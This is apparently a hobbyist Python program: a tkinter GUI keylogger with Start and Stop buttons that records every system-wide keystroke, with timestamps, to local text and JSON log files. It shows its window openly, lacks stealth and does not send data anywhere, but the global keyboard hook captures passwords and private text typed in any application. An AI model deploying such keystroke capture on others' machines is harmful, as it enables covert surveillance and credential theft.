import json
from datetime import datetime
import tkinter as tk
from pynput import keyboard

# Main window configuration
root = tk.Tk()
root.title("Keylogger")
root.geometry("360x320")
root.configure(bg="#3EBD84")
root.resizable(True, True)

listener = None  
is_pressed = False

# Save each pressed or released key to logs.txt in append mode
def update_txt_file(key_text):
    with open("logs.txt", "a", encoding="utf-8") as log_file:
        log_file.write(f"{key_text}\n")

# Append event data to logs.json and preserve previous runs
def update_json_file(event):
    try:
        with open("logs.json", "r", encoding="utf-8") as log_file:
            log_data = json.load(log_file)
    except (FileNotFoundError, json.JSONDecodeError):
        log_data = []

    log_data.append(event)
    with open("logs.json", "w", encoding="utf-8") as log_file:
        json.dump(log_data, log_file, indent=2)

# Update the live popup status inside the window
def update_status(key_name, action):
    current_label.config(text=f"{action}: {key_name}")
    time_label.config(text=f"Time: {datetime.now():%H:%M:%S}")

# Return a friendly string for the key value
def format_key(key):
    return getattr(key, "char", None) or str(key)

# Handle key press events
def on_press(key):
    global is_pressed
    key_name = format_key(key)
    action = "Pressed" if not is_pressed else "Held"
    is_pressed = True

    update_status(key_name, action)
    update_json_file({"event": action, "key": key_name, "time": datetime.now().isoformat()})

# Handle key release events
def on_release(key):
    global is_pressed
    key_name = format_key(key)
    is_pressed = False

    update_status(key_name, "Released")
    update_json_file({"event": "Released", "key": key_name, "time": datetime.now().isoformat()})
    update_txt_file(key_name)

# Start keylogger listener and update UI state
def start_keylogger():
    global listener
    if listener and listener.running:
        return

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_text.config(text="Keylogger is running...")
    start_button.config(state="disabled")
    stop_button.config(state="normal")

# Stop keylogger and restore button state
def stop_keylogger():
    global listener
    if listener is None:
        return

    listener.stop()
    status_text.config(text="Keylogger stopped.")
    start_button.config(state="normal")
    stop_button.config(state="disabled")

# App title and description
title_label = tk.Label(root, text="Secure Keylogger", bg="#F83838", fg="#ffffff", font=("Segoe UI", 16, "bold"))
title_label.pack(pady=(18, 4))
info_label = tk.Label(root, text="Record keystrokes into logs.txt and logs.json. Press Start to begin.", bg="#3EBD84", fg="#1427fa", wraplength=250, justify="center")
info_label.pack(padx=18)

# Buttons centered with padding
button_frame = tk.Frame(root, bg="#FFF200")
button_frame.pack(pady=16)

start_button = tk.Button(button_frame, text="Start Keylogger", width=16, bg="#4caf50", fg="#ffffff", command=start_keylogger)
start_button.grid(row=0, column=0, padx=10, pady=6)
stop_button = tk.Button(button_frame, text="Stop Keylogger", width=16, bg="#361B31", fg="#ffffff", command=stop_keylogger, state="disabled")
stop_button.grid(row=0, column=1, padx=10, pady=6)

# Popup-style status box inside the same window
popup_frame = tk.LabelFrame(root, text="Live Key Preview", bg="#ffffff", fg="#000000", padx=12, pady=10)
popup_frame.pack(padx=16, pady=(4, 16), fill="x")
current_label = tk.Label(popup_frame, text="Ready to start.", bg="#ffffff", fg="#0008ff", font=("Segoe UI", 11))
current_label.pack(anchor="w")
time_label = tk.Label(popup_frame, text="Time: --:--:--", bg="#ffffff", fg="#FF0000", font=("Segoe UI", 9))
time_label.pack(anchor="w", pady=(6, 0))

status_text = tk.Label(root, text="Waiting for action...", bg="#0091ff", fg="#F2FF00", font=("Segoe UI", 10, "italic"))
status_text.pack(pady=(0, 12))

root.mainloop()